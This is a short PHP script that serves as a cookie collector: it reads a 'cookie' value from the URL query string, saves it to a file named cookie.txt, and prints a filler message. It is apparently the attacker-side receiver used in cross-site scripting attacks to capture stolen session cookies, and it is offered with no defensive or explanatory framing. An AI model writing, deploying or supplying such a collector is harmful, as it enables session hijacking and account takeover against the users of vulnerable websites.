<?php
$cookie=$_GET[cookie];
$save=fopen("./cookie.txt","w");
fwrite($save, $cookie);
fclose($save);
echo "wow ummm";
?>
